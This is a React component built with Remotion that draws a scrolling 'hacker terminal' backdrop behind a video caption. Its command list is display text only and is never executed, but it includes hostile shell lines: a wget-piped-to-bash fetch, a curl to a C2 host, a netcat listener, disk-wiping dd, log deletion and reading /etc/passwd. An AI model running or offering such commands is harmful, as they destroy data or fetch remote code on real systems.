import React from "react";
import { useCurrentFrame, useVideoConfig, interpolate } from "remotion";
import { COLORS } from "../colors";
import { SceneData } from "../types";

interface Props {
  scene: SceneData;
}

const COMMANDS = [
  "nmap -sV 192.168.1.0/24",
  "ssh root@10.0.0.1",
  "cat /etc/passwd",
  "sudo chmod 777 /",
  "python3 exploit.py --target",
  "wget http://malware.sh | bash",
  "rm -rf /var/log/*",
  "netstat -an | grep LISTEN",
  "ps aux | grep root",
  "dd if=/dev/zero of=/dev/sda",
  "curl -s http://c2.server/shell.sh",
  "nc -lvp 4444",
  "msfconsole -q -x 'use exploit'",
  "hashcat -m 0 hashes.txt rockyou.txt",
];

function seededRand(seed: number): number {
  const x = Math.sin(seed + 1) * 10000;
  return x - Math.floor(x);
}

export const TerminalRain: React.FC<Props> = ({ scene }) => {
  const frame = useCurrentFrame();
  const { width, height } = useVideoConfig();
  const accent = scene.accent_color ?? COLORS.cyan;

  const lineHeight = 28;
  const visibleLines = Math.ceil(height / lineHeight) + 2;

  return (
    <div
      style={{
        width,
        height,
        background: COLORS.surface,
        position: "relative",
        overflow: "hidden",
        fontFamily: "'Courier New', monospace",
      }}
    >
      {/* Scrolling terminal lines */}
      <div
        style={{
          position: "absolute",
          top: -(frame % lineHeight),
          left: 0,
          right: 0,
        }}
      >
        {Array.from({ length: visibleLines + 1 }).map((_, i) => {
          const lineIdx = Math.floor((frame / lineHeight + i)) % COMMANDS.length;
          const cmd = COMMANDS[Math.floor(seededRand(lineIdx * 7 + i) * COMMANDS.length)];
          const isHighlight = seededRand(i + frame * 0.01) > 0.85;

          return (
            <div
              key={i}
              style={{
                height: lineHeight,
                display: "flex",
                alignItems: "center",
                padding: "0 30px",
                color: isHighlight ? accent : `${accent}66`,
                fontSize: 20,
                letterSpacing: 0.5,
              }}
            >
              <span style={{ color: `${accent}88`, marginRight: 12 }}>$</span>
              {cmd}
              {isHighlight && (
                <span
                  style={{
                    marginLeft: 4,
                    display: "inline-block",
                    width: 10,
                    height: 18,
                    background: accent,
                    opacity: Math.floor(frame / 15) % 2 === 0 ? 1 : 0,
                  }}
                />
              )}
            </div>
          );
        })}
      </div>

      {/* Gradient vignette */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          background:
            "radial-gradient(ellipse at center, transparent 40%, #06060988 100%)",
        }}
      />

      {/* Caption — y=1300, right:160 keeps text left of x=920 (YouTube buttons x=820-1080) */}
      <p
        style={{
          position: "absolute",
          top: 1300,
          left: 60,
          right: 160,
          color: COLORS.text,
          fontSize: 52,
          fontWeight: 900,
          textAlign: "center",
          lineHeight: 1.25,
          textShadow: "0 2px 12px rgba(0,0,0,0.9)",
          margin: 0,
          background: `${COLORS.black}CC`,
          padding: "16px 24px",
          borderRadius: 10,
          borderLeft: `4px solid ${accent}`,
        }}
      >
        {scene.caption}
      </p>
    </div>
  );
};
